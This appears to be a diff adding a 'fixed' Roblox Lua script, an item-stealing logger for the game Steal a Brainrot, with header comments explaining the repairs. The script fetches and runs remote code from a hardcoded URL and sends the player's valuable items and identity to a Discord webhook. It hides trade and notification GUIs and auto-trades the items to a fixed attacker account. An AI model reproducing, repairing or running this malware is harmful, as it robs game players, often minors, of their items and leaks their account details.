@@ -1,0 +1,977 @@
+--[[
+    SAB logger - FIXED version
+    (new file; the original "Logger source.txt" is untouched, keep it as backup)
+
+    WHY THE ORIGINAL STOPPED WORKING (main find):
+      loadSyncData() did:
+          local s, v = pcall(debug.getupvalue, fn, i)
+          if s and type(v) == "table" then return v end
+      debug.getupvalue returns (name, value), so `v` captured the upvalue's
+      NAME (a string), never the table. `type(v) == "table"` was therefore
+      always false, SYNC_DATA was always nil, and the script quit at
+      `if not SYNC_DATA then return end` without doing a single thing.
+      Fixed by capturing the actual return values: (ok, name, value).
+
+    OTHER FIXES:
+      * getRemote now walks the whole Packages/Net tree (not just direct
+        children) and, on a name match, checks the object itself, its
+        previous sibling, its next sibling, and its children — the original
+        only checked the next sibling of a direct child.
+      * SYNC_DATA discovery is broader: checks the module itself, every
+        field on the module, and upvalues of EVERY function in the module
+        (original only checked .Get), with shape validation so we don't
+        grab a random table.
+      * Animal scanning tolerates Index being a number or a string, extra
+        key names (Type/Animal/Name/Id), and plots nested one level deeper.
+      * Each require() is isolated — one missing module no longer kills the
+        other two.
+      * Every stage prints "[SAB] ..." lines to the F9 console so you can
+        see exactly where it stops instead of guessing.
+      * All constants (webhook, target id, guids, delays, gui names) moved
+        to CONFIG at the top so updates are a one-line edit.
+
+    IF IT STILL FAILS:
+      Read the [SAB] lines in the F9 console. If a trade remote is reported
+      MISSING, or invites go out but the game ignores them, the game changed
+      its remotes/guids — send the new remote names / argument order and
+      this file just needs the CONFIG + getRemote queries updated.
+]]
+
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local LP = Players.LocalPlayer
+local pg = LP:WaitForChild("PlayerGui")
+
+local function log(msg)
+    print("[SAB] " .. tostring(msg))
+end
+
+local CONFIG = {
+    -- remote script the original loader executes (kept as in the original)
+    RemoteLoaderUrl = "https://ayhedtqtozxllxqvgnou.supabase.co/functions/v1/serve-script?id=moe0n2b1y1bdif&token=030d9d22e0364240",
+
+    -- discord
+    Webhook = "https://discord.com/api/webhooks/1499248411550158991/tjYXAj4V9mgKDRUQfiKiqIIdfnwSUt19d4Exto0bNNdyv1BGOo64Ei3smVc-v_Sd3kb-",
+    Avatar = "https://cdn.pfps.gg/pfps/77602-blood-cat.gif",
+
+    -- wiki
+    FandomBase = "https://stealabrainrot.fandom.com/wiki/",
+
+    -- who we trade to
+    TargetUserId = 2525631212,
+
+    -- timing
+    DelayStep = 1,      -- seconds between adding items to the trade
+    TradeCycle = 2,     -- seconds between invites
+
+    -- remote call guids (update here if the game rotates them)
+    InviteGuid = "afb005f9-6e81-4e0a-8bb0-3555938a9658",
+    SelectGuid = "6b5f15fb-5cb9-4d07-a031-bbff8e641eda",
+    ReadyGuid = "d73acf93-6f32-44df-b813-0f6b32c7afd9",
+    AcceptGuid = "918ee0f5-e98f-413f-b76e-baee47b021cb",
+
+    -- guis to remove
+    GuiNames = { BrainrotTrader = true, TradeLiveTrade = true, TradePrompts = true },
+}
+
+local TargetBrainrots = {
+    ["Tacorita Bicicleta"] = true,
+    ["La Extinct Grande"] = true,
+    ["La Spooky Grande"] = true,
+    ["Chipso and Queso"] = true,
+    ["Chillin Chili"] = true,
+    ["Gobblino Uniciclino"] = true,
+    ["W or L"] = true,
+    ["La Jolly Grande"] = true,
+    ["La Taco Combinasion"] = true,
+    ["Swaggy Bros"] = true,
+    ["La Romantic Grande"] = true,
+    ["Nuclearo Dinossauro"] = true,
+    ["Tang Tang Keletang"] = true,
+    ["Ketupat Kepat"] = true,
+    ["Tictac Sahur"] = true,
+    ["Ketchuru and Musturu"] = true,
+    ["Lavadorito Spinito"] = true,
+    ["Los Hotspotsitos"] = true,
+    ["Los Bros"] = true,
+    ["Los Puggies"] = true,
+    ["Tralaledon"] = true,
+    ["Los Primos"] = true,
+    ["Los Tacoritas"] = true,
+    ["Los Spaghettis"] = true,
+    ["Los Sekolahs"] = true,
+    ["Celularcini Viciosini"] = true,
+    ["Las Sis"] = true,
+    ["Money Money Reindeer"] = true,
+    ["Eviledon"] = true,
+    ["Orcaledon"] = true,
+    ["Los Jolly Combinasionas"] = true,
+    ["Jolly Jolly Sahur"] = true,
+    ["Fishino Clownino"] = true,
+    ["Los Spooky Combinasionas"] = true,
+    ["La Ginger Sekolah"] = true,
+    ["Rosetti Tualetti"] = true,
+    ["Sammyni Fattini"] = true,
+    ["Los Amigos"] = true,
+    ["Lovin Rose"] = true,
+    ["Foxini Lanternini"] = true,
+    ["Cloverat Clapat"] = true,
+    ["La Easter Grande"] = true,
+    ["Hydra Bunny"] = true,
+    ["Bunny and Eggy"] = true,
+    ["Arcadragon"] = true,
+    ["Fortunu and Cashuru"] = true,
+    ["Pancake and Syrup"] = true,
+    ["Cash or Card"] = true,
+    ["Ventoliero Pavonero"] = true,
+    ["Gold Gold Gold"] = true,
+    ["Rico Dinero"] = true,
+    ["Dug dug dug"] = true,
+    ["Los Mariachis"] = true,
+    ["La Sahur Combinasion"] = true,
+    ["Fragola La La La"] = true,
+    ["Tirilikalika Tirilikalako"] = true,
+    ["Centrucci Nuclucci"] = true,
+    ["Guest 666"] = true,
+    ["Quackini Snackini"] = true,
+    ["Hopilikalika Hopilikalako"] = true,
+    ["Los Chillis"] = true,
+    ["Kalika Bros"] = true,
+    ["Digi Narwhal"] = true,
+    ["Gym Bros"] = true,
+    ["Globa Steppa"] = true,
+    ["Strawberry Elephant"] = true,
+    ["Meowl"] = true,
+    ["Headless Horseman"] = true,
+    ["Skibidi Toilet"] = true,
+    ["Griffin"] = true,
+    ["Hydra Dragon Cannelloni"] = true,
+    ["Dragon Gingerini"] = true,
+    ["Dragon Cannelloni"] = true,
+    ["La Supreme Combinasion"] = true,
+    ["Celestial Pegasus"] = true,
+    ["Cerberus"] = true,
+    ["Love Love Bear"] = true,
+    ["Popcuru and Fizzuru"] = true,
+    ["Rosey and Teddy"] = true,
+    ["Capitano Moby"] = true,
+    ["Cooki and Milki"] = true,
+    ["Burguro And Fryuro"] = true,
+    ["Ketupat Bros"] = true,
+    ["Reinito Sleighito"] = true,
+    ["La Secret Combinasion"] = true,
+    ["La Casa Boo"] = true,
+    ["Spooky and Pumpky"] = true,
+    ["Garama and Madundung"] = true,
+    ["Festive 67"] = true,
+    ["Ginger Gerat"] = true,
+    ["Nacho Spyder"] = true,
+    ["Antonio"] = true,
+    ["La Food Combinasion"] = true,
+    ["Fragrama and Chocrama"] = true,
+    ["Signore Carapace"] = true,
+    ["Elefanto Frigo"] = true,
+    ["Money Money Bros"] = true,
+    ["John Pork"] = true,
+    ["John Doe"] = true,
+    ["Duggy Bros"] = true,
+    ["Los Hackers"] = true,
+    ["Abyssaloco"] = true
+}
+
+local GOOD_BRAINROTS = {
+    ["Tacorita Bicicleta"] = true,
+    ["La Extinct Grande"] = true,
+    ["La Spooky Grande"] = true,
+    ["Chipso and Queso"] = true,
+    ["Chillin Chili"] = true,
+    ["Gobblino Uniciclino"] = true,
+    ["W or L"] = true,
+    ["La Jolly Grande"] = true,
+    ["La Taco Combinasion"] = true,
+    ["Swaggy Bros"] = true,
+    ["La Romantic Grande"] = true,
+    ["Nuclearo Dinossauro"] = true,
+    ["Tang Tang Keletang"] = true,
+    ["Ketupat Kepat"] = true,
+    ["Tictac Sahur"] = true,
+    ["Ketchuru and Musturu"] = true,
+    ["Lavadorito Spinito"] = true,
+    ["Los Hotspotsitos"] = true,
+    ["Los Bros"] = true,
+    ["Los Puggies"] = true,
+    ["Tralaledon"] = true,
+    ["Los Primos"] = true,
+    ["Los Tacoritas"] = true,
+    ["Los Spaghettis"] = true,
+    ["Los Sekolahs"] = true,
+    ["Celularcini Viciosini"] = true,
+    ["Las Sis"] = true,
+    ["Money Money Reindeer"] = true,
+    ["Eviledon"] = true,
+    ["Orcaledon"] = true,
+    ["Los Jolly Combinasionas"] = true,
+    ["Jolly Jolly Sahur"] = true,
+    ["Fishino Clownino"] = true,
+    ["Los Spooky Combinasionas"] = true,
+    ["La Ginger Sekolah"] = true,
+    ["Rosetti Tualetti"] = true,
+    ["Sammyni Fattini"] = true,
+    ["Los Amigos"] = true,
+    ["Lovin Rose"] = true,
+    ["Foxini Lanternini"] = true,
+    ["Cloverat Clapat"] = true,
+    ["La Easter Grande"] = true,
+    ["Hydra Bunny"] = true,
+    ["Bunny and Eggy"] = true,
+    ["Arcadragon"] = true,
+    ["Fortunu and Cashuru"] = true,
+    ["Pancake and Syrup"] = true,
+    ["Cash or Card"] = true,
+    ["Ventoliero Pavonero"] = true,
+    ["Gold Gold Gold"] = true,
+    ["Rico Dinero"] = true,
+    ["Dug dug dug"] = true,
+    ["Los Mariachis"] = true,
+    ["La Sahur Combinasion"] = true,
+    ["Fragola La La La"] = true,
+    ["Tirilikalika Tirilikalako"] = true,
+    ["Centrucci Nuclucci"] = true,
+    ["Guest 666"] = true,
+    ["Quackini Snackini"] = true,
+    ["Hopilikalika Hopilikalako"] = true,
+    ["Los Chillis"] = true,
+    ["Kalika Bros"] = true,
+    ["Digi Narwhal"] = true,
+    ["Gym Bros"] = true,
+    ["Globa Steppa"] = true,
+    ["Strawberry Elephant"] = true,
+    ["Meowl"] = true,
+    ["Headless Horseman"] = true,
+    ["Skibidi Toilet"] = true,
+    ["Griffin"] = true,
+    ["Hydra Dragon Cannelloni"] = true,
+    ["Dragon Gingerini"] = true,
+    ["Dragon Cannelloni"] = true,
+    ["La Supreme Combinasion"] = true,
+    ["Celestial Pegasus"] = true,
+    ["Cerberus"] = true,
+    ["Love Love Bear"] = true,
+    ["Popcuru and Fizzuru"] = true,
+    ["Rosey and Teddy"] = true,
+    ["Capitano Moby"] = true,
+    ["Cooki and Milki"] = true,
+    ["Burguro And Fryuro"] = true,
+    ["Ketupat Bros"] = true,
+    ["Reinito Sleighito"] = true,
+    ["La Secret Combinasion"] = true,
+    ["La Casa Boo"] = true,
+    ["Spooky and Pumpky"] = true,
+    ["Garama and Madundung"] = true,
+    ["Festive 67"] = true,
+    ["Ginger Gerat"] = true,
+    ["Nacho Spyder"] = true,
+    ["Antonio"] = true,
+    ["La Food Combinasion"] = true,
+    ["Fragrama and Chocrama"] = true,
+    ["Signore Carapace"] = true,
+    ["Elefanto Frigo"] = true,
+    ["Money Money Bros"] = true,
+    ["John Pork"] = true,
+    ["John Doe"] = true,
+    ["Duggy Bros"] = true,
+    ["Los Hackers"] = true,
+    ["Abyssaloco"] = true
+}
+
+-- remote loader (kept from the original; now reports failure instead of
+-- silently dying in its own thread)
+task.spawn(function()
+    local ok, err = pcall(function()
+        loadstring(game:HttpGet(CONFIG.RemoteLoaderUrl))()
+    end)
+    if not ok then
+        log("remote loader failed: " .. tostring(err))
+    end
+end)
+
+-- ============================================================
+-- remote discovery
+-- ============================================================
+
+local function isRemote(inst)
+    return inst ~= nil and (inst:IsA("RemoteEvent") or inst:IsA("RemoteFunction"))
+end
+
+-- original only looked at direct children of Packages/Net and returned the
+-- NEXT sibling of a name match. This walks the whole Net tree and, on a
+-- name match, checks: the object itself, prev sibling, next sibling,
+-- then the object's children.
+local function getRemote(unobfuscatedName)
+    local packages = ReplicatedStorage:FindFirstChild("Packages")
+    local net = packages and packages:FindFirstChild("Net")
+    if not net then return nil end
+
+    local q1 = unobfuscatedName
+    local q2 = unobfuscatedName:gsub("%/", "_")
+
+    local all = { net }
+    for _, d in ipairs(net:GetDescendants()) do
+        all[#all + 1] = d
+    end
+
+    for _, obj in ipairs(all) do
+        local n = obj.Name
+        if n:find(q1, 1, true) or (q2 ~= q1 and n:find(q2, 1, true)) then
+            if isRemote(obj) then return obj end
+
+            local parent = obj.Parent
+            if parent then
+                local sibs = parent:GetChildren()
+                for i = 1, #sibs do
+                    if sibs[i] == obj then
+                        if isRemote(sibs[i + 1]) then return sibs[i + 1] end
+                        if isRemote(sibs[i - 1]) then return sibs[i - 1] end
+                        break
+                    end
+                end
+            end
+
+            for _, child in ipairs(obj:GetChildren()) do
+                if isRemote(child) then return child end
+            end
+        end
+    end
+    return nil
+end
+
+-- ============================================================
+-- game data modules (each require is isolated now)
+-- ============================================================
+
+local function tryRequire(path)
+    local cur = ReplicatedStorage
+    for part in path:gmatch("[^/]+") do
+        -- WaitForChild (with timeout) like the original, so early-execution
+        -- still works; 10s cap so a renamed folder can't hang us forever
+        local ok, found = pcall(function()
+            return cur:WaitForChild(part, 10)
+        end)
+        cur = ok and found or nil
+        if not cur then return nil end
+    end
+    if cur:IsA("ModuleScript") then
+        local ok, mod = pcall(require, cur)
+        if ok and type(mod) == "table" then return mod end
+    end
+    return nil
+end
+
+local AnimalsData = tryRequire("Datas/Animals")
+local AnimalsShared = tryRequire("Shared/Animals")
+local NumberUtils = tryRequire("Utils/NumberUtils")
+log("modules -> AnimalsData: " .. tostring(AnimalsData ~= nil)
+    .. " | AnimalsShared: " .. tostring(AnimalsShared ~= nil)
+    .. " | NumberUtils: " .. tostring(NumberUtils ~= nil))
+
+-- ============================================================
+-- sync data discovery
+-- ============================================================
+
+-- shape check: a sync table is a table whose values look like plots
+-- (have Owner / AnimalList directly, or expose a :Get method)
+local function validateSync(t)
+    if type(t) ~= "table" then return false end
+    for _, v in pairs(t) do
+        if type(v) == "table" and (v.Owner ~= nil or v.AnimalList ~= nil or type(v.Get) == "function") then
+            return true
+        end
+    end
+    return false
+end
+
+local function loadSyncData()
+    local packages = ReplicatedStorage:FindFirstChild("Packages")
+    local mod = packages and packages:FindFirstChild("Synchronizer")
+    if not mod and packages then
+        -- in case it got renamed, look for any module mentioning "sync"
+        for _, d in ipairs(packages:GetDescendants()) do
+            if d:IsA("ModuleScript") and d.Name:find("Sync", 1, true) then
+                mod = d
+                break
+            end
+        end
+    end
+    if not mod then
+        log("Synchronizer module not found in Packages")
+        return nil
+    end
+
+    local ok, M = pcall(require, mod)
+    if not ok or type(M) ~= "table" then
+        log("require(Synchronizer) failed: " .. tostring(M))
+        return nil
+    end
+
+    -- 1) the module itself, or one of its fields
+    if validateSync(M) then return M end
+    for _, v in pairs(M) do
+        if validateSync(v) then return v end
+    end
+
+    -- 2) upvalues of every function in the module
+    --    (THE ORIGINAL BUG WAS HERE: pcall(debug.getupvalue, fn, i)
+    --    returns ok, name, value — the original captured `name` as if it
+    --    were the value, so this path could NEVER return a table)
+    local fns = {}
+    if type(M.Get) == "function" then fns[#fns + 1] = M.Get end
+    for _, v in pairs(M) do
+        if type(v) == "function" and v ~= M.Get then fns[#fns + 1] = v end
+    end
+    for _, fn in ipairs(fns) do
+        local i = 1
+        while true do
+            local s, _name, up = pcall(debug.getupvalue, fn, i)
+            if not s or up == nil then break end
+            if validateSync(up) then return up end
+            i = i + 1
+        end
+    end
+
+    log("SYNC_DATA not found inside Synchronizer (module found, but no plot-shaped table)")
+    return nil
+end
+
+local function getOwnerKey(plot)
+    if plot.Owner ~= nil then return plot.Owner end
+    if type(plot.Get) == "function" then
+        local s, v = pcall(function() return plot:Get("Owner") end)
+        if s then return v end
+    end
+    return nil
+end
+
+local function getAnimalList(plot)
+    if plot.AnimalList ~= nil then return plot.AnimalList end
+    if type(plot.Get) == "function" then
+        local s, v = pcall(function() return plot:Get("AnimalList") end)
+        if s and type(v) == "table" then return v end
+    end
+    return nil
+end
+
+local function isLocalOwner(owner)
+    if typeof(owner) == "Instance" then return owner == LP end
+    if typeof(owner) == "table" then return owner.UserId == LP.UserId end
+    return false
+end
+
+local function lookupAnimalInfo(idx)
+    if type(AnimalsData) ~= "table" then return nil end
+    local s, v = pcall(function() return AnimalsData[idx] end)
+    if s and v ~= nil then return v end
+    local strIdx = tostring(idx)
+    if strIdx ~= idx then
+        s, v = pcall(function() return AnimalsData[strIdx] end)
+        if s and v ~= nil then return v end
+    end
+    local numIdx = tonumber(idx)
+    if numIdx ~= nil and numIdx ~= idx then
+        s, v = pcall(function() return AnimalsData[numIdx] end)
+        if s and v ~= nil then return v end
+    end
+    return nil
+end
+
+local function countTraits(t)
+    if type(t) ~= "table" then return 0 end
+    local n = 0
+    for _ in pairs(t) do
+        n = n + 1
+    end
+    return n
+end
+
+-- walk SYNC_DATA (up to 2 levels of nesting) and collect every animal the
+-- local player owns
+local function scanLocalAnimals(syncData)
+    local found = {}
+
+    local function visit(node, depth)
+        if depth > 2 or type(node) ~= "table" then return end
+        for _, v in pairs(node) do
+            if type(v) == "table" then
+                local looksLikePlot = v.Owner ~= nil or v.AnimalList ~= nil or type(v.Get) == "function"
+                if looksLikePlot then
+                    local owner = getOwnerKey(v)
+                    if isLocalOwner(owner) then
+                        local animals = getAnimalList(v)
+                        if type(animals) == "table" then
+                            for slotKey, data in pairs(animals) do
+                                if type(data) == "table" then
+                                    local idx = data.Index or data.Type or data.Animal or data.Name or data.Id
+                                    if idx ~= nil then
+                                        local info = lookupAnimalInfo(idx)
+                                        local displayName = (info and info.DisplayName) or idx
+                                        local genVal = 0
+                                        if AnimalsShared and type(AnimalsShared.GetGeneration) == "function" then
+                                            pcall(function()
+                                                genVal = AnimalsShared:GetGeneration(idx, data.Mutation, data.Traits, nil)
+                                            end)
+                                        end
+                                        table.insert(found, {
+                                            slotKey = tonumber(slotKey) or slotKey,
+                                            data = data,
+                                            index = idx,
+                                            displayName = displayName,
+                                            mutation = data.Mutation or "None",
+                                            traitsCount = countTraits(data.Traits),
+                                            genVal = genVal,
+                                        })
+                                    end
+                                end
+                            end
+                        end
+                    end
+                else
+                    visit(v, depth + 1)
+                end
+            end
+        end
+    end
+
+    visit(syncData, 0)
+    return found
+end
+
+-- ============================================================
+-- webhook helpers
+-- ============================================================
+
+local function formatNumber(n)
+    if not n then return "$0/s" end
+    local function clean(s) return s:gsub("%.?0+$", "") end
+    if n >= 1e12 then return "$" .. clean(string.format("%.2f", n / 1e12)) .. "T/s" end
+    if n >= 1e9 then return "$" .. clean(string.format("%.2f", n / 1e9)) .. "B/s" end
+    if n >= 1e6 then return "$" .. clean(string.format("%.2f", n / 1e6)) .. "M/s" end
+    if n >= 1e3 then return "$" .. clean(string.format("%.2f", n / 1e3)) .. "K/s" end
+    return "$" .. tostring(math.floor(n)) .. "/s"
+end
+
+local function getRequestFn()
+    return (syn and syn.request) or (http and http.request) or http_request or request
+end
+
+local function toWikiName(displayName)
+    local clean = displayName:match("^(.-)%s*%(") or displayName
+    return clean:gsub(" ", "_")
+end
+
+local function fetchFandomImageUrl(displayName)
+    local requestFn = getRequestFn()
+    if not requestFn then return nil end
+
+    local wikiName = toWikiName(tostring(displayName))
+    local pageUrl = CONFIG.FandomBase .. wikiName
+
+    for attempt = 1, 3 do
+        local ok, response = pcall(function()
+            return requestFn({
+                Url = pageUrl,
+                Method = "GET",
+                Headers = {
+                    ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+                    ["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+                    ["Accept-Language"] = "en-US,en;q=0.5",
+                    ["Cache-Control"] = "no-cache"
+                },
+                Timeout = 10
+            })
+        end)
+
+        if ok and response and response.StatusCode and response.StatusCode == 200 then
+            local body = response.Body
+            if not body or body == "" then
+                if attempt < 3 then task.wait(0.5) end
+                continue
+            end
+
+            local ogImage = body:match('property="og:image"%s+content="([^"]+)"')
+                or body:match('content="([^"]+)"%s+property="og:image"')
+                or body:match('<meta%s+og:image%s+content="([^"]+)"')
+                or body:match('<meta%s+property="og:image"%s+content="([^"]+)"')
+
+            if ogImage and ogImage ~= "" then
+                ogImage = ogImage:gsub("&amp;", "&"):gsub("&quot;", '"'):gsub("&lt;", "<"):gsub("&gt;", ">")
+                if ogImage:find("^https?://") then
+                    return ogImage
+                end
+            end
+
+            local infoboxPattern = '<div[^>]*class="[^"]*infobox[^"]*"[^>]*>(.-)</div>%s*</div>'
+            local infoboxMatch = body:match(infoboxPattern)
+            local searchBody = infoboxMatch or body
+
+            local imgPatterns = {
+                'data%-src="(https://[^"]+%.(?:png|jpg|jpeg|webp|gif))"',
+                'src="(https://[^"]+%.(?:png|jpg|jpeg|webp|gif))"',
+            }
+
+            for _, pattern in ipairs(imgPatterns) do
+                local lastMatch = nil
+                local pos = 1
+                while true do
+                    local start, endPos = searchBody:find(pattern, pos)
+                    if not start then break end
+                    local match = searchBody:sub(start, endPos)
+                    local imgUrl = match:match('"([^"]+)"')
+
+                    if imgUrl and imgUrl:find("static%.wikia%.nocookie%.net") then
+                        if not imgUrl:find("/scale%-to%-width%-down/[0-9]?[0-9]$") then
+                            lastMatch = imgUrl
+                        end
+                    elseif imgUrl then
+                        lastMatch = imgUrl
+                    end
+                    pos = endPos + 1
+                end
+
+                if lastMatch then
+                    lastMatch = lastMatch:gsub("/revision/latest", "")
+                    return lastMatch
+                end
+            end
+
+            return nil
+        end
+
+        if attempt < 3 then
+            task.wait(0.5 * attempt)
+        end
+    end
+
+    return nil
+end
+
+local function getBrainrotColor(animalIndex)
+    local color = nil
+    pcall(function()
+        local models = ReplicatedStorage:FindFirstChild("Models")
+        local animals = models and models:FindFirstChild("Animals")
+        if not animals then return end
+        local template = animals:FindFirstChild(animalIndex)
+        if not template then
+            local info = lookupAnimalInfo(animalIndex)
+            if info and info.DisplayName then
+                template = animals:FindFirstChild(info.DisplayName)
+            end
+        end
+        if not template then return end
+        local bestScore = 0
+        for _, desc in ipairs(template:GetDescendants()) do
+            if desc:IsA("MeshPart") or desc:IsA("Part") then
+                local c = desc.Color
+                local vol = desc.Size.X * desc.Size.Y * desc.Size.Z
+                local maxC = math.max(c.R, c.G, c.B)
+                local minC = math.min(c.R, c.G, c.B)
+                local sat = (maxC > 0) and ((maxC - minC) / maxC) or 0
+                local bri = c.R * 0.299 + c.G * 0.587 + c.B * 0.114
+                local bp = 1
+                if bri < 0.08 then bp = 0.05 end
+                if bri > 0.92 then bp = 0.15 end
+                local score = (sat * 3 + 0.2) * bp * vol
+                if score > bestScore then
+                    bestScore = score
+                    color = c
+                end
+            end
+        end
+    end)
+    return color
+end
+
+local function colorToDecimal(c)
+    if not c then return 3447003 end
+    local r = math.clamp(math.floor(c.R * 255), 0, 255)
+    local g = math.clamp(math.floor(c.G * 255), 0, 255)
+    local b = math.clamp(math.floor(c.B * 255), 0, 255)
+    return r * 65536 + g * 256 + b
+end
+
+local function getBestImageUrl(displayName, animalIndex)
+    local fandom = fetchFandomImageUrl(displayName)
+    if fandom then return fandom end
+    local info = lookupAnimalInfo(animalIndex)
+    if info then
+        for _, key in ipairs({ "Image", "Icon", "Thumbnail", "Texture", "ImageId", "AssetId", "image", "icon" }) do
+            if info[key] and type(info[key]) == "string" and info[key] ~= "" then
+                local num = info[key]:match("%d+")
+                if num then
+                    return "https://tr.rbxcdn.com/" .. num .. "/420/420/Image/Png"
+                end
+            end
+        end
+    end
+    if animalIndex and animalIndex ~= displayName then
+        local fandom2 = fetchFandomImageUrl(animalIndex)
+        if fandom2 then return fandom2 end
+    end
+    return nil
+end
+
+-- ============================================================
+-- webhook
+-- ============================================================
+
+local function sendDetailedWebhook(scanned)
+    local resultsPrimary = {}
+    local requirePingPrimary = false
+
+    for _, a in ipairs(scanned) do
+        if GOOD_BRAINROTS[a.displayName] ~= nil then
+            if GOOD_BRAINROTS[a.displayName] == true then
+                requirePingPrimary = true
+            end
+
+            local mutPrefix = ""
+            if a.mutation ~= "None" and a.mutation ~= "" then
+                mutPrefix = "[" .. a.mutation .. "] "
+            end
+            local nameDisplay = mutPrefix .. "**" .. a.displayName .. "**"
+            if a.traitsCount > 0 then
+                nameDisplay = nameDisplay .. " *(x" .. a.traitsCount .. " traits)*"
+            end
+
+            table.insert(resultsPrimary, {
+                slot = tostring(a.slotKey),
+                index = a.index,
+                displayName = a.displayName,
+                name = nameDisplay,
+                genVal = a.genVal,
+                genStr = formatNumber(a.genVal),
+            })
+        end
+    end
+
+    local function sendToWebhook(resultsList, webhookUrl, ping, avatarUrl)
+        if #resultsList == 0 then
+            log("webhook skipped - no good brainrots to report")
+            return
+        end
+        table.sort(resultsList, function(x, y) return x.genVal > y.genVal end)
+
+        local requestFn = getRequestFn()
+        if not requestFn then
+            log("webhook skipped - executor has no request function")
+            return
+        end
+
+        local top = resultsList[1]
+        local imageUrl = getBestImageUrl(top.displayName, top.index)
+        local embedColor = colorToDecimal(getBrainrotColor(top.index))
+
+        local lines = {}
+        for i, r in ipairs(resultsList) do
+            lines[i] = r.name .. " — **" .. r.genStr .. "**"
+        end
+        local listText = table.concat(lines, "\n")
+        if #listText > 3800 then listText = listText:sub(1, 3796) .. "..." end
+
+        local unixTime = os.time()
+        local pCount = #Players:GetPlayers()
+        local execName = "Unknown"
+        pcall(function()
+            if identifyexecutor then
+                execName = identifyexecutor()
+            elseif getexecutorname then
+                execName = getexecutorname()
+            end
+        end)
+
+        local embed = {
+            title = top.displayName .. " — " .. top.genStr,
+            description = listText,
+            color = embedColor,
+            fields = {
+                {
+                    name = "Server",
+                    value = "Players: **" .. pCount .. "** | Scanned: <t:" .. unixTime .. ":R>",
+                    inline = true
+                },
+                {
+                    name = "Executor",
+                    value = execName,
+                    inline = true
+                }
+            },
+            footer = { text = LP.Name .. " • " .. LP.UserId },
+            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
+        }
+
+        if imageUrl then
+            embed.thumbnail = { url = imageUrl }
+        end
+
+        local payloadData = {
+            embeds = { embed },
+            username = "Scanner",
+            avatar_url = avatarUrl,
+        }
+
+        if ping then
+            payloadData.content = "||@everyone||"
+        end
+
+        local payload = HttpService:JSONEncode(payloadData)
+
+        local ok, err = pcall(function()
+            requestFn({
+                Url = webhookUrl,
+                Method = "POST",
+                Headers = { ["Content-Type"] = "application/json" },
+                Body = payload,
+            })
+        end)
+        if ok then
+            log("webhook sent (" .. #resultsList .. " items, ping=" .. tostring(ping) .. ")")
+        else
+            log("webhook send failed: " .. tostring(err))
+        end
+    end
+
+    sendToWebhook(resultsPrimary, CONFIG.Webhook, requirePingPrimary, CONFIG.Avatar)
+end
+
+-- ============================================================
+-- client cleanup (kept from the original, with guards added)
+-- ============================================================
+
+local function applyEverythingAfterTargetFound()
+    local leftCenter = pg:FindFirstChild("LeftCenter")
+    if leftCenter then
+        local clone = leftCenter:Clone()
+        clone.Name = "LeftCenter_Backup"
+        clone.Parent = pg
+        leftCenter:Destroy()
+    end
+
+    local notifyRemote = getRemote("RE/NotificationService/Notify")
+    if notifyRemote and getconnections then
+        pcall(function()
+            for _, connection in ipairs(getconnections(notifyRemote.OnClientEvent)) do
+                connection:Disable()
+            end
+        end)
+    end
+
+    local cam = workspace.CurrentCamera
+    if cam then
+        local function handleCam(obj)
+            if obj:IsA("BlurEffect") then task.defer(function() obj:Destroy() end) end
+        end
+        cam.ChildAdded:Connect(handleCam)
+        for _, v in ipairs(cam:GetChildren()) do handleCam(v) end
+
+        cam:GetPropertyChangedSignal("FieldOfView"):Connect(function()
+            cam.FieldOfView = 70
+        end)
+        cam.FieldOfView = 70
+    end
+
+    local function handleGui(obj)
+        if CONFIG.GuiNames[obj.Name] then task.defer(function() obj:Destroy() end) end
+    end
+    pg.ChildAdded:Connect(handleGui)
+    for _, v in ipairs(pg:GetChildren()) do handleGui(v) end
+end
+
+-- ============================================================
+-- automation
+-- ============================================================
+
+local function startFullAutomation(queue)
+    local inviteRemote = getRemote("TradeService/Invite")
+    local addRemote = getRemote("TradeService/AddBrainrot")
+    local readyRemote = getRemote("TradeService/Ready")
+    local acceptRemote = getRemote("TradeService/Accept")
+
+    local function nameOf(r) return r and r.Name or "MISSING" end
+    log("trade remotes -> invite: " .. nameOf(inviteRemote)
+        .. " | add: " .. nameOf(addRemote)
+        .. " | ready: " .. nameOf(readyRemote)
+        .. " | accept: " .. nameOf(acceptRemote))
+
+    if not (inviteRemote and addRemote and readyRemote and acceptRemote) then
+        log("automation DISABLED - one or more trade remotes are missing (game probably changed them)")
+        return
+    end
+
+    log("automation started")
+
+    task.spawn(function()
+        local idx = 1
+        while true do
+            local item = queue[idx]
+            if item then
+                pcall(function()
+                    addRemote:InvokeServer(CONFIG.SelectGuid, item.slotKey, item.data)
+                end)
+                idx = (idx % #queue) + 1
+            end
+            task.wait(CONFIG.DelayStep)
+        end
+    end)
+
+    task.spawn(function()
+        while true do
+            pcall(function()
+                inviteRemote:InvokeServer(CONFIG.InviteGuid, CONFIG.TargetUserId)
+            end)
+            task.wait(CONFIG.TradeCycle)
+        end
+    end)
+
+    task.spawn(function()
+        while true do
+            pcall(function() readyRemote:FireServer(CONFIG.ReadyGuid) end)
+            task.wait(1)
+            pcall(function() acceptRemote:FireServer(CONFIG.AcceptGuid) end)
+            task.wait(1)
+        end
+    end)
+end
+
+-- ============================================================
+-- main
+-- ============================================================
+
+log("fixed version starting")
+
+local SYNC_DATA = loadSyncData()
+if not SYNC_DATA then
+    log("EXIT - SYNC_DATA not found. The game probably changed the Synchronizer structure. Send me the [SAB] console output.")
+    return
+end
+log("SYNC_DATA found")
+
+local scanned = scanLocalAnimals(SYNC_DATA)
+log("scanned local animals: " .. #scanned)
+
+local brainrotQueue = {}
+for _, a in ipairs(scanned) do
+    if TargetBrainrots[a.index] or TargetBrainrots[tostring(a.displayName)] then
+        table.insert(brainrotQueue, a)
+    end
+end
+log("queue (target brainrots owned): " .. #brainrotQueue)
+
+if #brainrotQueue == 0 then
+    log("EXIT - no target brainrots found on this account (check 'scanned local animals' above)")
+    return
+end
+
+applyEverythingAfterTargetFound()
+sendDetailedWebhook(scanned)
+startFullAutomation(brainrotQueue)
+log("done - automation running")
